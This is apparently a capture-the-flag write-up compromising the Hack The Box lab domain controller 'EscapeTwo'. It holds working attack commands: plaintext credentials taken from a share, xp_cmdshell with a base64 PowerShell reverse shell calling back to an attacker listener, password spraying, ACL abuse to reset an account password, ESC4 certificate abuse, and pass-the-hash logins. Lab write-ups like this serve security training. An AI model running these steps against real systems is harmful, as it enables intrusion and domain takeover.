---
hidden: true
---

# EscapeTwo

## Machine Informationr

As is common in real life Windows pentests, you will start this box with credentials for the following account: **`rose / KxEPkKe6R8su`**

### Domain Info

Domain name: SEQUEL.htb

Domain Controller: DC01.SEQUEL.htb

## Port Scanning

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt 10.10.11.51
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 14:57:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-13T14:59:15+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-13T14:59:15+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-13T14:59:15+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-13T14:27:50
|_Not valid after:  2055-01-13T14:27:50
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T14:59:15+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-13T14:59:15+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
49836/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-time: 
|   date: 2025-01-13T14:58:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

There are some interesting ports:

* **389/636**: LDAP services
* **445**: SMB
* **1433**: MSSQL Service
* **5985**: WinRM&#x20;

## SMB Enumeration

Enumerate available SMB shares.&#x20;

```bash
$ smbclient -L //DC01.sequel.htb/ -U "rose%KxEPkKe6R8su" -I 10.10.11.51

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk      
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to DC01.sequel.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

The `Accouting Department` shares is interesting, try to connect it using `smbclient` tool.

```bash
smbclient -N //10.10.11.51/'Accounting Department' -U "rose%KxEPkKe6R8su"
```

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

There are two interesting Excel file. Let's download them.

In che `accounts.xlsx` file there are Users and Passwords of Domain Users group.&#x20;

{% code title="AD Creds" %}
```
angela@sequel.htb:0fwz7Q4mSpurIt99
oscar@sequel.htb:86LxLBMgEWaKUnBG
kevin@sequel.htb:Md9Wlq1E5bZnVDVo
sa@sequel.htb:MSSQLP@ssw0rd!
```
{% endcode %}

The `sa`'s creds is usefull to enumerate MSSQL service.

## MSSQL Enumeration

We use impacket mssqlclient.py script to establish a connection with MSSQL CLI.

```bash
./mssqlclient.py sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

Enable the xp\_cmdshell to running commands in the DC

```bash
> enable_xp_cmdshell
> xp_cmdshell whoami
```

### Get Reverse Shell

Let's generate a simple Nishang Powershell revshell and execute it via the xp\_cmdshell:

{% code title="Listener" %}
```bash
nc -lnvp 9009
```
{% endcode %}

Create a payload:

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1
cat rev.ps1| iconv -t UTF-16LE | base64 -w 0                        
```

Copy the output of the last command and execute this command:

{% code title="Rev Shell" overflow="wrap" %}
```sql
xp_cmdshell powershell -e "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMQAxADcAJwAsADkAMAAwADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAAoA"
```
{% endcode %}

### Password Spray

Snooping through the folders we can find the SQL config file in the directory "`C:\SQL2019\ExpressAdv_ENU`"

```powershell
cd C:\SQL2019\ExpressAdv_ENU
type .\sql-Configuration.INI
```

<figure><img src="../../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

As we can see there is a password, and we can try to do a password spray with all account found.

Get all user by ldap query:

{% code overflow="wrap" %}
```bash
ldapsearch -H ldap://10.10.11.51 -D "rose@sequel.htb" -w 'KxEPkKe6R8su' -b "dc=sequel,dc=htb" "(objectClass=user)" | grep "sAMAccountName: " | awk -F'sAMAccountName: ' '{print $2}' > users.txt
```
{% endcode %}

Now try use crackmapexec tool to perform a password spray attack

```bash
crackmapexec smb 10.10.11.51 -u users.txt -p "WqSZAF6CysDQbGb3"
```

Ryan pwd. The password found is his.

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

### User.flag

Connect via evil-winrm as Ryan.

```bash
evil-winrm -u ryan -p 'WqSZAF6CysDQbGb3' -i 10.10.11.51
```

Read the flag.

```powershell
type C:\Users\ryan\Desktop\user.txt
```

## BloodHound Enumeration

Use `bloodhound-python` tool in kali linux to get all domain information for AD enumeration.

{% code overflow="wrap" %}
```bash
bloodhound-python -c all -ns 10.10.11.51 -dc DC01.sequel.htb -d sequel.htb --zip -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Then upload the .zip result file in bloodhound and let's make the queries.

## Privilege Escalation

### ADCS



From linux machine run Certipy python script to get this information from remote

{% code overflow="wrap" %}
```bash
certipy-ad find -u ryan -p WqSZAF6CysDQbGb3 -target sequel.htb -text -stdout -vulnerable
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

Nothing :(&#x20;

With Bloodhound we can look that there is a account named "ca\_svc" that probably manage the certificate authority.&#x20;

<figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

We can notice that Ryan has "WriteOwner" privilege on "CA\_SVC" account.

{% hint style="info" %}
To run commands below i have to stablished a interactive revshell with Penelope python tool.

[https://github.com/brightio/penelope ](https://github.com/brightio/penelope)
{% endhint %}

Set "Ryan" as owner of "ca\_svc" account.

<pre class="language-powershell"><code class="lang-powershell"><strong>powershell -ep bypass
</strong>
Import-Module .\PowerView.ps1

Set-DomainObjectOwner -Identity 'ca_svc' -OwnerIdentity 'ryan'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "ca_svc" -PrincipalIdentity "ryan"
</code></pre>

Reset ca\_svc's password.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>$NewPassword = ConvertTo-SecureString 'Password9999' -AsPlainText -Force
</strong>Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword
</code></pre>

Now we can re-run the certipy with ca\_svc user

{% code overflow="wrap" %}
```bash
certipy-ad find -u ca_svc -p 'Password9999' -target-ip 10.10.11.51 -text -stdout -vulnerable
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

There is a ESC4 misconfiguration in a Certificate Template.

### ESC4 Vulnerability

Use req funtionality of certipy tool to require Administrator certificate e get the certificate.

{% code title="" overflow="wrap" %}
```bash
certipy-ad req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc -p 'Password9999' -template DunderMifflinAuthentication -target-ip 10.10.11.51 -upn Administrator@sequel.htb
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Extract administrator credentials.

{% code title="" overflow="wrap" %}
```bash
certipy-ad auth -pfx administrator.pfx
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

### Use HASH obtained

With the Administrator NT hash obtained from the AD CS ESC4 vulnerability, we can gain administrator access to DC01 with the WinRM protocol.&#x20;

{% code title="evil-winrm" overflow="wrap" %}
```bash
evil-winrm -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i 10.10.11.51
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

### Root.flag

Get the root flag.

```powershell
type C:\Users\Administrator\Desktop\root.txt
```





